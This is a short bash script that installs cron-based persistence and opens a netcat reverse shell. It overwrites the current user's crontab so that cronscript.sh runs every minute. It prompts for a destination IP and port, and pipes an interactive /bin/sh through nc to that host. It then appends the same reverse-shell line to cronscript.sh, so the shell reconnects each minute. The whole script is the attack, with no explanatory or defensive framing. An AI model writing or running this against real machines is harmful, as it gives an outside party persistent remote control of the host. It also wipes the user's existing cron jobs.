#!/bin/bash
echo "#!/bin/bash" > cronscript.sh

USER="$(whoami)"
echo "*/1 * * * * bash $PWD/cronscript.sh" > /var/spool/cron/crontabs/$USER

read -p "Enter destination ip :" IP
read -p "Enter destination port :" PORT
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP $PORT > /tmp/f

echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP $PORT > /tmp/f" >> cronscript.sh

